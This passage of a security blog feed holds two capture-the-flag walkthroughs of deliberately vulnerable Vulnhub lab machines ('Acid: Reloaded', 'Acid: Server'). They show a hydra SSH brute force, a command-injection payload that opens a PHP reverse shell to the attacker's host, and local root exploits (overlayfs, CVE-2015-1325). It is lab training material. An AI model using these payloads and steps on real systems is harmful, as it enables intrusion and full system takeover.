<p>keep the same steps as above until we found the file <code>Avinash.contact</code> which is a XML file and there is a string is base64 encoded. Then I decoded it and got <code>NooB@123</code></p>

<p>Then I created a dictionary file based on the names/keywords in file <code>Avinash.contact</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# cat dict.txt
</span><span class='line'>Avinash
</span><span class='line'>avinash
</span><span class='line'>Makke
</span><span class='line'>makke
</span><span class='line'>acid
</span><span class='line'>acid.exploit
</span><span class='line'>&lt;a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x61;&#99;&#105;&#100;&#x2e;&#x65;&#120;&#112;&#108;&#111;&#105;&#116;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#x61;&#99;&#105;&#x64;&#46;&#x65;&#120;&#x70;&#108;&#x6f;&#x69;&#116;&#x40;&#103;&#x6d;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;&lt;/a>
</span><span class='line'>NooB@123</span></code></pre></td></tr></table></div></figure></p>

<p>Then I use hydra with the file dict.txt to brute force SSH login, and found <code>makke/NooB@123</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# hydra -L dict.txt -P dict.txt 10.1.1.139 ssh -s 22
</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-09-11 08:49:26
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort&hellip;
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 64 login tries (l:8/p:8), ~0 tries per task
</span><span class='line'>[DATA] attacking service ssh on port 22
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>1 of 1 target successfully completed, 2 valid passwords found
</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-09-11 08:49:46</span></code></pre></td></tr></table></div></figure></p>

<p>Login to the SSH with makke&rsquo;s login
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# ssh &lt;a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#109;&#x61;&#x6b;&#107;&#x65;&#64;&#49;&#x30;&#46;&#49;&#x2e;&#49;&#x2e;&#x31;&#x33;&#57;">&#109;&#x61;&#107;&#107;&#x65;&#x40;&#49;&#x30;&#46;&#49;&#46;&#x31;&#46;&#x31;&#x33;&#57;&lt;/a>
</span><span class='line'>    _    &lt;em>&lt;strong>&lt;em> &lt;/em>&lt;/strong> &lt;/em>&lt;em>&lt;strong>        &lt;/strong>&lt;strong>  &lt;/strong>&lt;/em>&lt;strong> _     &lt;/strong>&lt;em>    _    &lt;/em>&lt;strong>&lt;em>  &lt;/em>&lt;/strong>&lt;strong> &lt;/strong>&lt;strong>&lt;br/>
</span><span class='line'>   / \  / &lt;/strong>&lt;em>|&lt;/em> &lt;em>|  _ \      |  _ | &lt;/em>&lt;em>&lt;strong>| |   / _ \  / \  |  _ | &lt;/strong>&lt;strong>|  _ \
</span><span class='line'>  / _ | |    | || | | |&lt;/strong>&lt;/em>&lt;strong>| |&lt;em>) |  &lt;/em>| | |  | | | |/ _ \ | | | |  &lt;em>| | | | |
</span><span class='line'> / &lt;/em>&lt;/strong> \ |&lt;strong>&lt;em> | || |&lt;/em>| |&lt;/strong>&lt;strong>&lt;em>|  _ &lt;| |&lt;/em>&lt;/strong>| |&lt;strong>| |&lt;em>| / &lt;/em>&lt;/strong> | |&lt;em>| | |&lt;/em>&lt;strong>| |&lt;em>| |
</span><span class='line'>/&lt;/em>/   __&lt;/strong>&lt;em>|&lt;/em>&lt;strong>|&lt;/strong>&lt;strong>/      |_| __&lt;/strong>&lt;strong>|&lt;/strong>&lt;em>&lt;strong>_&lt;/strong>/&lt;/em>/   __&lt;strong>&lt;em>/|&lt;/em>&lt;/strong>&lt;strong>|&lt;/strong>__/&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                -by Acid
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>Wanna Knock me out ???
</span><span class='line'>3.2.1 Let&rsquo;s Start the Game.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#109;&#x61;&#107;&#107;&#101;&#x40;&#49;&#48;&#x2e;&#x31;&#x2e;&#x31;&#x2e;&#49;&#x33;&#57;">&#109;&#x61;&#107;&#x6b;&#101;&#64;&#49;&#48;&#46;&#49;&#x2e;&#49;&#46;&#49;&#x33;&#57;&lt;/a>&rsquo;s password:
</span><span class='line'>Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Documentation:  &lt;a href="https://help.ubuntu.com/">https://help.ubuntu.com/&lt;/a>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p>134 packages can be updated.
</span><span class='line'>80 updates are security updates.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Last login: Thu Sep 10 17:10:50 2015 from 10.1.1.130
</span><span class='line'>makke@acid:~$ id
</span><span class='line'>uid=1001(makke) gid=1001(makke) groups=1001(makke)
</span><span class='line'>makke@acid:~$ ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:bb:6e:b3&lt;br/>
</span><span class='line'>          inet addr:10.1.1.139  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:febb:6eb3/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:312455 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:319819 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:53077085 (53.0 MB)  TX bytes:41973680 (41.9 MB)
</span><span class='line'>          Interrupt:19 Base address:0x2000&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>lo        Link encap:Local Loopback&lt;br/>
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:3026 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:3026 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0
</span><span class='line'>          RX bytes:301825 (301.8 KB)  TX bytes:301825 (301.8 KB)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>makke@acid:~$</span></code></pre></td></tr></table></div></figure></p>

<p>Poking around and found clues in file <code>.bash_history</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -ah
</span><span class='line'>.  ..  .bash_history  .bash_logout  .bashrc  .cache  .hint  .profile
</span><span class='line'>makke@acid:~$ ls -ahl
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x 3 makke makke 4.0K Aug 24 21:28 .
</span><span class='line'>drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
</span><span class='line'>-rw&mdash;&mdash;- 1 makke makke  272 Sep 10 17:13 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke  220 Aug 24 19:11 .bash_logout
</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke 3.7K Aug 24 19:11 .bashrc
</span><span class='line'>drwx&mdash;&mdash; 2 makke makke 4.0K Aug 24 21:25 .cache
</span><span class='line'>-rw-rw-r&ndash; 1 makke makke   40 Aug 24 21:28 .hint
</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke  675 Aug 24 19:11 .profile
</span><span class='line'>makke@acid:~$ cat .bash_history
</span><span class='line'>exit
</span><span class='line'>cd ..
</span><span class='line'>clear
</span><span class='line'>cd /
</span><span class='line'>ls
</span><span class='line'>cd bin/
</span><span class='line'>clear
</span><span class='line'>./overlayfs
</span><span class='line'>clear
</span><span class='line'>cd /home/makke/
</span><span class='line'>clear
</span><span class='line'>nano .hint
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>ls -a
</span><span class='line'>cat .hint
</span><span class='line'>clear
</span><span class='line'>cd /bin/
</span><span class='line'>ls
</span><span class='line'>./overlayfs
</span><span class='line'>clear
</span><span class='line'>wgt
</span><span class='line'>wget
</span><span class='line'>apt-get remove wget
</span><span class='line'>su
</span><span class='line'>su -
</span><span class='line'>exit
</span><span class='line'>id
</span><span class='line'>pwd
</span><span class='line'>ls
</span><span class='line'>ls -l
</span><span class='line'>pwd
</span><span class='line'>ls -alh
</span><span class='line'>cat .bash_history
</span><span class='line'>/bin/overlayfs
</span><span class='line'>exit
</span><span class='line'>makke@acid:~$ cat .bash_history</span></code></pre></td></tr></table></div></figure></p>

<p>From the output above, there is an executable file <code>/bin/overlayfs</code> which is overlayfs local root exploit file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -al /bin/overlayfs
</span><span class='line'>-rwxr-xr-x 1 root root 12236 Aug 24 21:22 /bin/overlayfs</span></code></pre></td></tr></table></div></figure></p>

<p>run it and ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ /bin/overlayfs
</span><span class='line'>spawning threads
</span><span class='line'>mount #1
</span><span class='line'>mount #2
</span><span class='line'>child threads done
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=0(root) gid=0(root) groups=0(root),1001(makke)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>sh: 2: cd: can&rsquo;t cd to root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -al&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>total 68
</span><span class='line'>drwx&mdash;&mdash;  5 root root  4096 Aug 24 21:32 .
</span><span class='line'>drwxr-xr-x 22 root root  4096 Aug 24 20:58 ..
</span><span class='line'>-rw&mdash;&mdash;-  1 root root 23934 Aug 24 22:25 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  3135 Aug  8 18:02 .bashrc
</span><span class='line'>drwx&mdash;&mdash;  2 root root  4096 Aug 24 17:46 .cache
</span><span class='line'>drwx&mdash;&mdash;  3 root root  4096 Aug  6 17:55 .config
</span><span class='line'>drwx&mdash;&mdash;  3 root root  4096 Aug  6 15:51 .dbus
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   284 Aug 24 20:57 .flag.txt
</span><span class='line'>-rw&mdash;&mdash;-  1 root root  2775 Aug 24 21:32 .mysql_history
</span><span class='line'>-rw&mdash;&mdash;-  1 root root   147 Aug 24 23:32 .nano_history
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   140 Feb 20  2014 .profile
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root    66 Aug  6 17:31 .selected_editor&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat .flag.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have completed the Challenge Successfully.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Your Flag is : &ldquo;Black@Current@Ice-Cream&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>-ACiD&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Twitter:&lt;a href="https://twitter.com/m_avinash143">https://twitter.com/m_avinash143&lt;/a>
</span><span class='line'>Facebook: &lt;a href="https://www.facebook.com/M.avinash143">https://www.facebook.com/M.avinash143&lt;/a>
</span><span class='line'>LinkedIN: &lt;a href="https://in.linkedin.com/pub/avinash-thapa/101/406/4b5">https://in.linkedin.com/pub/avinash-thapa/101/406/4b5&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Done!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Acid: Server]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server/"/>
    <updated>2015-09-03T05:36:37-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server</id>
    <content type="html"><![CDATA[<p><strong>Acid:Server</strong> is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-server,125/">here</a>.</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/138178348?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Hints stored in some pages' source code or title, otherwise dirbuster/wfuzz can be used to find hidden folders</li>
<li>Command injection vulnerability exists in <code>/Challenge/Magic_Box/command.php</code>, exploit it can obtain a reverse shell</li>
<li>Apport/Ubuntu - Local Root Race Condition exploit (CVE-2015-1325) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden folder and a page which has command injection vulnerability, analyse it with burp suite and exploit it to get a reverse shell</li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1325, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.132 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (&lt;a href="http://www.nta-monitor.com/tools/arp-scan/">http://www.nta-monitor.com/tools/arp-scan/&lt;/a>)
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.132  00:0c:29:36:7b:18   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:fb:ea:26   VMware, Inc.</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.132 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -H -msf -p 1-65535 -Iv -T4 10.1.1.132
</span><span class='line'>adding 10.1.1.132/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:14028 -> 10.1.1.132:33447
</span><span class='line'>TCP open 10.1.1.132:33447  ttl 64
</span><span class='line'>sender statistics 291.2 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131074 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open             unknown[33447]     from 10.1.1.132  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>From the result above, TCP port 33447 has been discovered.</p>

<p>Then I run NMAP scan to probe more detail information against the opening port.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Host is up (0.00029s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>|&lt;em>http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|&lt;/em>http-server-header: Apache/2.4.10 (Ubuntu)
</span><span class='line'>|_http-title: /Challenge
</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>I found that apache 2.4.10 is running on port 33447, and the server OS is Ubuntu Linux.</p>

<p>Then I start up the firefox to have a close look the web application and found hidden path from title or dirbuster scan or decode the password on the bottom of source code.</p>

<p>The hidden folder is <code>/Challenge</code></p>

<p>Then I keep using <code>dirbuster</code> to <code>/Challenge/</code> folder and found some pages, one of them is <code>cake.php</code> which again, the title give us the clue to another hidden folder <code>/Magic_Box</code></p>

<p>Keep running <code>dirbuster</code> to <code>/Challenge/Magic_Box</code> folder and found interesting php page <code>command.php</code> which has command injection vulnerability</p>

<p>Then by using <code>burp proxy</code> and tamper the request to exploit command injection vulnerability to get a shell, due to there is no <code>wget</code> in the target server, I use the following php command:</p>

<p>payload (the payload need to be <font color="red">URL encoded</font>):</p>

<p><code>127.0.0.1; php -r '$sock=fsockopen("10.1.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>

<p>Setting up <code>NC</code> to listen on port 4444, then send the payload to server and got a reverse shell with <code>www-data</code> limited privilege.</p>

<p>Then running some enumeration and poking around, I found the target server is Ubuntu 15.04, which is local privilege escape vulnerable to <code>CVE-2015-1325</code></p>

<p>Compile and send the exploit to target server, then run it to get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/tmp$ ./37088
</span><span class='line'>./37088
</span><span class='line'>created /var/crash/_bin_sleep.33.crash
</span><span class='line'>crasher: my pid is 2571
</span><span class='line'>apport stopped, pid = 2572
</span><span class='line'>getting pid 2571
</span><span class='line'>current pid = 2570..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..
</span><span class='line'>&lt;strong> child: current pid = 2571
</span><span class='line'>&lt;/strong> child: executing /bin/su
</span><span class='line'>Password: sleeping 2s..&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>checker: mode 4516
</span><span class='line'>waiting for file to be unlinked..writing to fifo
</span><span class='line'>fifo written.. wait&hellip;
</span><span class='line'>waiting for /etc/sudoers.d/core to appear..
</span><span class='line'>success&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p> / &lt;strong>&lt;em>|&lt;/em>&lt;/strong>  _ &lt;strong>   &lt;/strong> _ _ &lt;strong> &lt;/strong> &lt;em>| |&lt;/em> _   &lt;em>| | __ &lt;/em>| |&lt;em>(&lt;/em>) &lt;em>&lt;strong>  _ &lt;/strong>  &lt;/em>&lt;strong>
</span><span class='line'>| |   / _ | &lsquo;&lt;em> \ / &lt;/em>&lt;code>| '__/ _&lt;/code> | &lt;/strong>| | | | |/ &lt;em>` | __| |/ _ | &rsquo;&lt;/em> \/ &lt;strong>|
</span><span class='line'>| |&lt;/strong>| (&lt;em>) | | | | (&lt;/em>| | | | (&lt;em>| | |&lt;/em>| |&lt;em>| | | (&lt;/em>| | |&lt;em>| | (&lt;/em>) | | | _&lt;em> \
</span><span class='line'> _&lt;/em>&lt;strong>_&lt;/strong>/|&lt;em>| |&lt;/em>|_&lt;em>, |&lt;/em>|  _&lt;em>,&lt;/em>|_&lt;em>|_&lt;/em>,&lt;em>|&lt;/em>|_&lt;em>,&lt;/em>|_&lt;em>|&lt;/em>|_&lt;strong>/|&lt;em>| |&lt;/em>|&lt;/strong>&lt;em>/
